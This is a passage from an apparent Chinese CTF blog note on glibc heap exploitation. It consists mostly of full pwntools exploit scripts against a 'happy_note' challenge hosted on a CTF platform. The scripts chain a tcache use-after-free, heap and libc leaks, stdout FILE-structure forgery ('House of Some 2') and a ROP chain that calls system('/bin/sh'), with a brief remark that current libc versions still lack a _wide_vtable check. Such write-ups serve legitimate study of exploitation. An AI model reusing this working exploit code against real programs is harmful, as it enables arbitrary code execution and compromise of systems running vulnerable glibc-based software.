class="line">add(<span class="number">10</span>, <span class="number">0x78</span>)   <span class="comment"># chunk10 == chunk11 (pointer)</span></span><br><span class="line">add(<span class="number">8</span>, <span class="number">0x78</span>)    <span class="comment"># fake_chunk</span></span><br><span class="line"></span><br><span class="line">libc_stdout = libc.symbols[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>]</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&#x27;8&#x27; * 0x60</span></span><br><span class="line"><span class="string">0      size</span></span><br><span class="line"><span class="string">stdout tcache_key</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">edit(<span class="number">8</span>, <span class="string">b&#x27;8&#x27;</span> * <span class="number">0x60</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x211</span>) + p64(PROTECT_PTR(libc_stdout - <span class="number">0x10</span>, heap_base+<span class="number">0x1000</span>)))</span><br><span class="line">AUTOGDB <span class="keyword">and</span> g.execute(<span class="string">&#x27;hexdump $chunk4 0x500&#x27;</span>) <span class="keyword">and</span> sleep(T)</span><br><span class="line">AUTOGDB <span class="keyword">and</span> g.execute(<span class="string">&#x27;bins&#x27;</span>) <span class="keyword">and</span> sleep(T)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x200</span>, <span class="number">2</span>)</span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x200</span>, <span class="number">2</span>)    <span class="comment"># stdout - 0x10 (e-&gt;key)</span></span><br><span class="line">AUTOGDB <span class="keyword">and</span> g.execute(<span class="string">&#x27;x/12gx $rebase(0x40a0)&#x27;</span>) <span class="keyword">and</span> sleep(T)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">AUTOGDB <span class="keyword">and</span> g.execute(<span class="string">&#x27;p &quot;house of some 2&quot;&#x27;</span>) <span class="keyword">and</span> sleep(T)</span><br><span class="line"><span class="keyword">if</span> DEBUG:</span><br><span class="line">    libc_IO_wfile_jumps_maybe_mmap = libc.symbols[<span class="string">&#x27;_IO_wfile_jumps_maybe_mmap&#x27;</span>]</span><br><span class="line">    libc_IO_str_jumps = libc.symbols[<span class="string">&#x27;_IO_str_jumps&#x27;</span>]</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="comment"># not found</span></span><br><span class="line">    libc_IO_wfile_jumps_maybe_mmap = libc_base + <span class="number">0x215F40</span></span><br><span class="line">    libc_IO_str_jumps = libc_base + <span class="number">0x2166C0</span></span><br><span class="line">libc_IO_default_xsputn = libc_IO_str_jumps + <span class="number">0x38</span></span><br><span class="line">libc_IO_default_xsgetn = libc_IO_str_jumps + <span class="number">0x40</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># read(stdout-&gt;_fileno, stdout-&gt;_IO_buf_base, stdout-&gt;_IO_buf_end - stdout-&gt;_IO_buf_base)</span></span><br><span class="line">payload1 = flat(&#123;</span><br><span class="line">    <span class="number">0x00</span>: <span class="number">0x8000</span>,                                   <span class="comment"># _IO_USER_LOCK =&gt; disable lock</span></span><br><span class="line">    <span class="number">0x38</span>: libc_stdout,                              <span class="comment"># _IO_buf_base  =&gt; read buf</span></span><br><span class="line">    <span class="number">0x40</span>: libc_stdout + <span class="number">0x1c8</span>,                      <span class="comment"># _IO_buf_end   =&gt; read nbytes 0x1c8,</span></span><br><span class="line">                                                    <span class="comment">#                  size of _IO_FILE_plus + _IO_wide_data</span></span><br><span class="line">    <span class="number">0x70</span>: <span class="number">0</span>,                                        <span class="comment"># _fileno       =&gt; read fd, stdin</span></span><br><span class="line">    <span class="number">0xa0</span>: libc_stdout + <span class="number">0x100</span>,                      <span class="comment"># _wide_data    =&gt; writable address,</span></span><br><span class="line">                                                    <span class="comment">#                  or corrupt in fileops.c:717,</span></span><br><span class="line">                                                    <span class="comment">#                  decide_maybe_mmap: fp-&gt;_wide_data-&gt;_wide_vtable = &amp;_IO_wfile_jumps;</span></span><br><span class="line">    <span class="number">0xc0</span>: <span class="number">0</span>,                                        <span class="comment"># _mode &lt; 0</span></span><br><span class="line">    <span class="number">0xd8</span>: libc_IO_wfile_jumps_maybe_mmap - <span class="number">0x18</span>,    <span class="comment"># vtable</span></span><br><span class="line">&#125;, filler=<span class="string">b&quot;\x00&quot;</span>)</span><br><span class="line">payload1 = payload1  <span class="comment"># stderr._unused2 and stderr.vtable</span></span><br><span class="line"><span class="keyword">if</span> DEBUG:</span><br><span class="line">    AUTOGDB <span class="keyword">and</span> g.execute(<span class="string">&#x27;b fileops.c:667&#x27;</span>) <span class="keyword">and</span> sleep(T)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="comment">#AUTOGDB and g.execute(&#x27;b puts&#x27;) and sleep(T)    # _IO_OVERFLOW in _IO_new_file_xsputn</span></span><br><span class="line">    <span class="comment">#AUTOGDB and g.execute(f&#x27;b *&#123;hex(libc_base + 0x86078)&#125;&#x27;) and sleep(T)    # decide_maybe_mmap</span></span><br><span class="line">    <span class="comment">#AUTOGDB and g.execute(f&#x27;b *&#123;hex(libc_base + 0x8ccb3)&#125;&#x27;) and sleep(T)    # read in _IO_file_underflow</span></span><br><span class="line">    <span class="comment">#AUTOGDB and g.execute(f&#x27;b *&#123;hex(libc_base + 0x8ba34)&#125;&#x27;) and sleep(T)    # _IO_SYSSTAT</span></span><br><span class="line">    AUTOGDB <span class="keyword">and</span> g.execute(<span class="string">f&#x27;b *<span class="subst">&#123;<span class="built_in">hex</span>(libc_base + <span class="number">0x8cd01</span>)&#125;</span>&#x27;</span>) <span class="keyword">and</span> sleep(T)    <span class="comment"># ret</span></span><br><span class="line">    libc_pop_rdi = libc_base + <span class="number">0x2a3e5</span></span><br><span class="line">    libc_ret = libc_base + <span class="number">0x29cd6</span></span><br><span class="line">edit(<span class="number">1</span>, p64(<span class="number">0</span>)*<span class="number">2</span> + payload1)</span><br><span class="line"></span><br><span class="line">libc_system = libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">libc_sh = <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line"></span><br><span class="line">offset_retn = <span class="number">0xc8</span>  <span class="comment"># retn of _IO_file_underflow_maybe_mmap</span></span><br><span class="line">rop = [</span><br><span class="line">    libc_ret,   <span class="comment"># align to 16 bytes</span></span><br><span class="line">    libc_pop_rdi, libc_sh,</span><br><span class="line">    libc_system</span><br><span class="line">]</span><br><span class="line"><span class="comment"># 0x1c8 =&gt; _IO_FILE_plus + _IO_wide_data</span></span><br><span class="line">rdx = offset_retn + <span class="number">0x1c8</span>   <span class="comment"># real House of Some 2</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># mempcpy(stdio-&gt;_IO_write_ptr, &amp;st, stdout-&gt;_IO_buf_end - stdout-&gt;_IO_buf_base)</span></span><br><span class="line"><span class="comment"># read(stdout-&gt;_fileno, stdout-&gt;_IO_buf_base, stdout-&gt;_IO_buf_end - stdout-&gt;_IO_buf_base)</span></span><br><span class="line">payload2 = flat(&#123;</span><br><span class="line">    <span class="number">0x08</span>: libc_stdout,                          <span class="comment"># _IO_read_ptr  =&gt; readable address,</span></span><br><span class="line">                                                <span class="comment">#                  or corrupu in fileops:537,</span></span><br><span class="line">                                                <span class="comment">#                  return *(unsigned char *) fp-&gt;_IO_read_ptr;</span></span><br><span class="line">    <span class="number">0x28</span>: libc_stdout - rdx,                    <span class="comment"># _IO_write_ptr =&gt; memcpy dest</span></span><br><span class="line">    <span class="number">0x30</span>: libc_stdout,                          <span class="comment"># _IO_write_end =&gt; memcpy n = rdx</span></span><br><span class="line">    <span class="number">0x38</span>: libc_stdout - rdx + offset_retn,      <span class="comment"># _IO_buf_base  =&gt; read buf</span></span><br><span class="line">    <span class="number">0x40</span>: libc_stdout + <span class="number">0x1c8</span>,                  <span class="comment"># _IO_buf_end   =&gt; memcpy n and read nbytes,</span></span><br><span class="line">                                                <span class="comment">#                  size of stack + stdout(_IO_FILE_plus + _IO_wide_data)</span></span><br><span class="line">    <span class="number">0x70</span>: <span class="number">0</span>,                                    <span class="comment"># _fileno       =&gt; read fd, stdin</span></span><br><span class="line">    <span class="number">0xa0</span>: libc_stdout + <span class="number">0xe0</span>,                   <span class="comment"># _wide_data    =&gt; libc_stdout + 0xe0</span></span><br><span class="line">    <span class="number">0xc0</span>: <span class="number">0</span>,                                    <span class="comment"># _mode &lt; 0</span></span><br><span class="line">    <span class="number">0xd8</span>: libc_IO_default_xsputn - <span class="number">0x90</span>,        <span class="comment"># vtable,  0x90 =&gt; offset of __stat in _IO_jump_t</span></span><br><span class="line">    <span class="number">0xe0</span>: &#123;</span><br><span class="line">        <span class="number">0xe0</span>: libc_IO_wfile_jumps_maybe_mmap    <span class="comment"># _wide_data-&gt;_wide_vtable</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;, filler=<span class="string">b&quot;\x00&quot;</span>)</span><br><span class="line">r.send(payload2)</span><br><span class="line"></span><br><span class="line"><span class="comment"># mempcpy(&amp;st, stdio-&gt;_IO_read_ptr, stdout-&gt;_IO_buf_end - stdout-&gt;_IO_buf_base)</span></span><br><span class="line"><span class="comment"># read(stdout-&gt;_fileno, stdout-&gt;_IO_buf_base, stdout-&gt;_IO_buf_end - stdout-&gt;_IO_buf_base)</span></span><br><span class="line">payload3 = flat(&#123;</span><br><span class="line">    <span class="comment">#0x00: 0xdeadbeaf,                               # retn</span></span><br><span class="line">    <span class="number">0x00</span>: rop,                                      <span class="comment"># retn</span></span><br><span class="line">    rdx - offset_retn: &#123;</span><br><span class="line">        <span class="number">0x08</span>: libc_stdout - rdx,                    <span class="comment"># _IO_read_ptr  =&gt; memcpy src</span></span><br><span class="line">        <span class="number">0x10</span>: libc_stdout,                          <span class="comment"># _IO_read_end  =&gt; memcpy n = rdx</span></span><br><span class="line">        <span class="number">0xa0</span>: libc_stdout + <span class="number">0xe0</span>,                   <span class="comment"># _wide_data    =&gt; libc_stdout + 0xe0</span></span><br><span class="line">        <span class="number">0xc0</span>: <span class="number">0</span>,                                    <span class="comment"># _mode &lt; 0</span></span><br><span class="line">        <span class="number">0xd8</span>: libc_IO_default_xsgetn - <span class="number">0x90</span>,        <span class="comment"># vtable,  0x90 =&gt; offset of __stat in _IO_jump_t</span></span><br><span class="line">        <span class="number">0xe0</span>: &#123;</span><br><span class="line">            <span class="number">0xe0</span>: libc_IO_wfile_jumps_maybe_mmap    <span class="comment"># _wide_data-&gt;_wide_vtable</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;, filler=<span class="string">b&quot;\x00&quot;</span>)</span><br><span class="line">r.send(payload3)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br><span class="line">r.close()</span><br></pre></td></tr></table></figure>
<h2 id="没有-wide-vtable检查的HoS2">没有_wide_vtable检查的HoS2<a class="anchor" href="#没有-wide-vtable检查的HoS2">·</a></h2>
<p>目前为止的<code>libc-2.41</code>都还没给<code>_wide_vtable</code>加上<code>validate</code>检查</p>
<p>所以可以像<a href="https://tover.xyz/p/PWN-Note-4-House-of-Some-2">笔记vol.4</a>那样打个偷懒的<code>House of Some 2</code></p>
<p>参考代码：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span>  <span class="comment"># for flat</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;wt.exe&#x27;</span>, <span class="string">&#x27;bash&#x27;</span>, <span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line">T = <span class="number">0.1</span></span><br><span class="line"></span><br><span class="line">LOCAL = <span class="literal">False</span></span><br><span class="line">AUTOGDB = <span class="literal">True</span></span><br><span class="line">DEBUG = <span class="literal">False</span></span><br><span class="line"><span class="keyword">if</span> LOCAL:</span><br><span class="line">    env = &#123;<span class="string">&#x27;LD_LIBRARY_PATH&#x27;</span>: <span class="string">&#x27;.&#x27;</span>&#125;</span><br><span class="line">    r = process(<span class="string">&#x27;./happy_note&#x27;</span>, env=env)</span><br><span class="line">    <span class="keyword">if</span> AUTOGDB:</span><br><span class="line">        gid, g = gdb.attach(r, api=<span class="literal">True</span>, gdbscript=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        sleep(<span class="number">1</span>)</span><br><span class="line">        AUTOGDB <span class="keyword">and</span> g.execute(<span class="string">&#x27;dir ./src&#x27;</span>) <span class="keyword">and</span> sleep(T)</span><br><span class="line">        AUTOGDB <span class="keyword">and</span> g.execute(<span class="string">&#x27;c&#x27;</span>) <span class="keyword">and</span> sleep(T)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        gdb.attach(r, gdbscript=<span class="string">&#x27;dir ./src&#x27;</span>)</span><br><span class="line">        <span class="built_in">input</span>(<span class="string">&#x27;Waiting GDB...&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    AUTOGDB = <span class="literal">False</span></span><br><span class="line">    r = remote(<span class="string">&#x27;node4.anna.nssctf.cn&#x27;</span>, <span class="number">28956</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">idx, size, mode=<span class="number">1</span></span>):</span></span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;&gt;&gt; &#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;Note size:&#x27;</span>, <span class="built_in">str</span>(size).encode())</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;Choose a note:&#x27;</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;Choose a mode: [1] or [2]&#x27;</span>, <span class="built_in">str</span>(mode).encode())</span><br><span class="line">    sleep(T)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">idx</span>):</span></span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;&gt;&gt; &#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;Choose a note:&#x27;</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line">    sleep(T)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;&gt;&gt; &#x27;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;Which one do you want to show?&#x27;</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;content: &#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> r.recvline()[:-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx, content</span>):</span></span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;&gt;&gt; &#x27;</span>, <span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;Choose a note:&#x27;</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line">    r.sendafter(<span class="string">b&#x27;Edit your content:&#x27;</span>, content)</span><br><span class="line">    sleep(T)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">uaf</span>(<span class="params">idx</span>):</span></span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;&gt;&gt; &#x27;</span>, <span class="string">b&#x27;666&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;Choose a note:&#x27;</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line">    sleep(T)</span><br><span class="line"></span><br><span class="line">AUTOGDB <span class="keyword">and</span> g.execute(<span class="string">&#x27;p &quot;fastbin attack and uaf&quot;&#x27;</span>) <span class="keyword">and</span> sleep(T)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add(i, <span class="number">0x78</span>)</span><br><span class="line">add(<span class="number">11</span>, <span class="number">0x78</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    delete(i)</span><br><span class="line">uaf(<span class="number">11</span>)</span><br><span class="line">AUTOGDB <span class="keyword">and</span> g.execute(<span class="string">&#x27;bins&#x27;</span>) <span class="keyword">and</span> sleep(T)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">AUTOGDB <span class="keyword">and</span> g.execute(<span class="string">&#x27;p &quot;leak heap_base&quot;&#x27;</span>) <span class="keyword">and</span> sleep(T)</span><br><span class="line">heap_base = u64(show(<span class="number">11</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) &lt;&lt; <span class="number">12</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;<span class="built_in">hex</span>(heap_base) = &#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">PROTECT_PTR</span>(<span class="params">ptr, pos</span>):</span></span><br><span class="line">    <span class="keyword">return</span> (pos &gt;&gt; <span class="number">12</span>) ^ ptr</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">AUTOGDB <span class="keyword">and</span> g.execute(<span class="string">&#x27;p &quot;leak libc_base&quot;&#x27;</span>) <span class="keyword">and</span> sleep(T)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    add(i, <span class="number">0x200</span>)</span><br><span class="line">AUTOGDB <span class="keyword">and</span> g.execute(<span class="string">&#x27;x/12gx $rebase(0x40a0)&#x27;</span>) <span class="keyword">and</span> sleep(T)</span><br><span class="line">AUTOGDB <span class="keyword">and</span> g.execute(<span class="string">&#x27;set $chunk5=*(size_t*)$rebase(0x40c8)-0x10&#x27;</span>) <span class="keyword">and</span> sleep(T)</span><br><span class="line">AUTOGDB <span class="keyword">and</span> g.execute(<span class="string">&#x27;set $chunk4=*(size_t*)$rebase(0x40c0)-0x10&#x27;</span>) <span class="keyword">and</span> sleep(T)</span><br><span class="line">edit(<span class="number">5</span>, <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">0x190</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x81</span>))   <span class="comment"># chunk 6 =&gt; unsortedbin</span></span><br><span class="line">                                                <span class="comment"># fakechunk =&gt; heap_base + 0x1280</span></span><br><span class="line">edit(<span class="number">4</span>, <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">0x190</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x81</span>))   <span class="comment"># todo: rewrite chunk5 =&gt; heap_base + 0x1070</span></span><br><span class="line">delete(<span class="number">7</span>)   <span class="comment"># split top_chunk</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    delete(i)</span><br><span class="line">AUTOGDB <span class="keyword">and</span> g.execute(<span class="string">&#x27;hexdump $chunk5 0x500&#x27;</span>) <span class="keyword">and</span> sleep(T)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">11</span>, p64(PROTECT_PTR(heap_base + <span class="number">0x1280</span>, heap_base)))</span><br><span class="line">add(<span class="number">10</span>, <span class="number">0x78</span>)   <span class="comment"># chunk10 == chunk11 (pointer)</span></span><br><span class="line">AUTOGDB <span class="keyword">and</span> g.execute(<span class="string">&#x27;bins&#x27;</span>) <span class="keyword">and</span> sleep(T)</span><br><span class="line"></span><br><span class="line">add(<span class="number">9</span>, <span class="number">0x78</span>)    <span class="comment"># fake_chunk</span></span><br><span class="line">AUTOGDB <span class="keyword">and</span> g.execute(<span class="string">&#x27;x/12gx $rebase(0x40a0)&#x27;</span>) <span class="keyword">and</span> sleep(T)</span><br><span class="line">AUTOGDB <span class="keyword">and</span> g.execute(<span class="string">&#x27;bins&#x27;</span>) <span class="keyword">and</span> sleep(T)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">9</span>, <span class="string">b&#x27;9&#x27;</span> * <span class="number">0x78</span>)    <span class="comment"># calloc =&gt; &#x27;9&#x27; * 0x78 + chunk6-&gt;bk</span></span><br><span class="line">AUTOGDB <span class="keyword">and</span> g.execute(<span class="string">&#x27;hexdump $chunk5 0x500&#x27;</span>) <span class="keyword">and</span> sleep(T)</span><br><span class="line"><span class="keyword">if</span> DEBUG:</span><br><span class="line">    libc_base = u64(show(<span class="number">9</span>)[<span class="number">0x78</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x1e0ce0</span></span><br><span class="line">    libc = ELF(<span class="string">&#x27;libc-2.35-debug.so&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    libc_base = u64(show(<span class="number">9</span>)[<span class="number">0x78</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x1e0ce0</span> - <span class="number">0x39000</span></span><br><span class="line">    libc = ELF(<span class="string">&#x27;libc6_2.35-0ubuntu3_amd64.so&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;<span class="built_in">hex</span>(libc_base) = &#125;</span>&#x27;</span>)</span><br><span class="line">libc.address = libc_base</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">AUTOGDB <span class="keyword">and</span> g.execute(<span class="string">&#x27;p &quot;hijack stdout&quot;&#x27;</span>) <span class="keyword">and</span> sleep(T)</span><br><span class="line">delete(<span class="number">10</span>)</span><br><span class="line">edit(<span class="number">11</span>, p64(PROTECT_PTR(heap_base + <span class="number">0x1070</span>, heap_base)))</span><br><span class="line">AUTOGDB <span class="keyword">and</span> g.execute(<span class="string">&#x27;bins&#x27;</span>) <span class="keyword">and</span> sleep(T)</span><br><span class="line">AUTOGDB <span class="keyword">and</span> g.execute(<span class="string">&#x27;x/12gx $rebase(0x40a0)&#x27;</span>) <span class="keyword">and</span> sleep(T)</span><br><span class="line">add(<span class="number">10</span>, <span class="number">0x78</span>)   <span class="comment"># chunk10 == chunk11 (pointer)</span></span><br><span class="line">add(<span class="number">8</span>, <span class="number">0x78</span>)    <span class="comment"># fake_chunk</span></span><br><span class="line"></span><br><span class="line">libc_stdout = libc.symbols[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>]</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&#x27;8&#x27; * 0x60</span></span><br><span class="line"><span class="string">0      size</span></span><br><span class="line"><span class="string">stdout tcache_key</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">edit(<span class="number">8</span>, <span class="string">b&#x27;8&#x27;</span> * <span class="number">0x60</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x211</span>) + p64(PROTECT_PTR(libc_stdout - <span class="number">0x10</span>, heap_base+<span class="number">0x1000</span>)))</span><br><span class="line">AUTOGDB <span class="keyword">and</span> g.execute(<span class="string">&#x27;hexdump $chunk4 0x500&#x27;</span>) <span class="keyword">and</span> sleep(T)</span><br><span class="line">AUTOGDB <span class="keyword">and</span> g.execute(<span class="string">&#x27;bins&#x27;</span>) <span class="keyword">and</span> sleep(T)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x200</span>, <span class="number">2</span>)</span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x200</span>, <span class="number">2</span>)    <span class="comment"># stdout - 0x10 (e-&gt;key)</span></span><br><span class="line">AUTOGDB <span class="keyword">and</span> g.execute(<span class="string">&#x27;x/12gx $rebase(0x40a0)&#x27;</span>) <span class="keyword">and</span> sleep(T)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">AUTOGDB <span class="keyword">and</span> g.execute(<span class="string">&#x27;p &quot;house of some 2&quot;&#x27;</span>) <span class="keyword">and</span> sleep(T)</span><br><span class="line"><span class="keyword">if</span> DEBUG:</span><br><span class="line">    libc_IO_wfile_jumps_maybe_mmap = libc.symbols[<span class="string">&#x27;_IO_wfile_jumps_maybe_mmap&#x27;</span>]</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="comment"># not found</span></span><br><span class="line">    libc_IO_wfile_jumps_maybe_mmap = libc_base + <span class="number">0x215F40</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># read(stdout-&gt;_fileno, stdout-&gt;_IO_buf_base, stdout-&gt;_IO_buf_end - stdout-&gt;_IO_buf_base)</span></span><br><span class="line">payload1 = flat(&#123;</span><br><span class="line">    <span class="number">0x00</span>: <span class="number">0x8000</span>,                                   <span class="comment"># _IO_USER_LOCK =&gt; disable lock</span></span><br><span class="line">    <span class="number">0x38</span>: libc_stdout,                              <span class="comment"># _IO_buf_base  =&gt; read buf</span></span><br><span class="line">    <span class="number">0x40</span>: libc_stdout + <span class="number">0x1c8</span>,                      <span class="comment"># _IO_buf_end   =&gt; read nbytes 0x1c8,</span></span><br><span class="line">                                                    <span class="comment">#                  size of _IO_FILE_plus + _IO_wide_data</span></span><br><span class="line">    <span class="number">0x70</span>: <span class="number">0</span>,                                        <span class="comment"># _fileno       =&gt; read fd, stdin</span></span><br><span class="line">    <span class="number">0xa0</span>: libc_stdout + <span class="number">0x100</span>,                      <span class="comment"># _wide_data    =&gt; writable address,</span></span><br><span class="line">                                                    <span class="comment">#                  or corrupt in fileops.c:717,</span></span><br><span class="line">                                                    <span class="comment">#                  decide_maybe_mmap: 